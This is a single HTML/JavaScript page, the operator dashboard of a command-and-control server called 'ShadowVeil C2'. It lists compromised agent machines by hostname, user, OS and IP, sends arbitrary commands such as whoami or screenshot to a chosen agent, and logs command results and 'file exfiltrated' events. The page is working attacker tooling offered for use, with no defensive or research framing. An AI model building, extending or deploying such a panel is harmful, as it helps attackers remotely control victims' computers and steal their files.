<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShadowVeil C2 Dashboard</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        body { background: #0d0d0d; color: #00ff00; font-family: 'Courier New'; }
        .container { max-width: 1200px; margin: auto; padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { border: 1px solid #00ff00; padding: 10px; text-align: left; }
        input, button { padding: 10px; margin: 5px; background: #000; color: #00ff00; border: 1px solid #00ff00; }
        #output { background: #000; height: 400px; overflow-y: scroll; padding: 10px; border: 1px solid #00ff00; }
    </style>
</head>
<body>
    <div class="container">
        <h1>SHADOWVEIL C2 // QUANTUM CONTROL</h1>
        <h2>Online Agents</h2>
        <table id="agents-table">
            <thead><tr><th>ID</th><th>Hostname</th><th>User</th><th>OS</th><th>IP</th><th>Last Seen</th><th>Actions</th></tr></thead>
            <tbody></tbody>
        </table>

        <h2>Command Execution</h2>
        <input type="text" id="agent-id" placeholder="Agent ID">
        <input type="text" id="command" placeholder="Enter command (e.g. whoami, dir, screenshot)" style="width: 400px;">
        <button onclick="sendCommand()">Execute</button>

        <h2>Output</h2>
        <pre id="output"></pre>
    </div>

    <script>
        const socket = io();

        function log(msg) {
            document.getElementById('output').innerHTML += msg + "\n";
            document.getElementById('output').scrollTop = document.getElementById('output').scrollHeight;
        }

        socket.on('agent_online', (data) => {
            log(`[+] Agent online: ${data.hostname} (${data.id})`);
            loadAgents();
        });

        socket.on('task_complete', (data) => {
            log(`\n[RESULT from ${data.agent_id}]\n${data.result}`);
        });

        socket.on('file_received', (data) => {
            log(`[+] File exfiltrated: ${data.filename} -> ${data.path}`);
        });

        function loadAgents() {
            fetch('/agents')
                .then(r => r.json())
                .then(agents => {
                    const tbody = document.querySelector('#agents-table tbody');
                    tbody.innerHTML = '';
                    agents.forEach(agent => {
                        const row = document.createElement('tr');
                        row.innerHTML = `
                            <td>${agent[0]}</td>
                            <td>${agent[1]}</td>
                            <td>${agent[2]}</td>
                            <td>${agent[3]}</td>
                            <td>${agent[4]}</td>
                            <td>${agent[5]}</td>
                            <td><button onclick="selectAgent('${agent[0]}')">Select</button></td>
                        `;
                        tbody.appendChild(row);
                    });
                });
        }

        function selectAgent(id) {
            document.getElementById('agent-id').value = id;
            log(`Selected agent: ${id}`);
        }

        function sendCommand() {
            const agentId = document.getElementById('agent-id').value;
            const cmd = document.getElementById('command').value;
            if (!agentId || !cmd) return;

            fetch('/send_command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({agent_id: agentId, command: cmd})
            }).then(r => r.json()).then(data => {
                log(`[+] Task sent: ${cmd} -> ${agentId}`);
            });
        }

        loadAgents();
        setInterval(loadAgents, 5000);
    </script>
</body>
</html>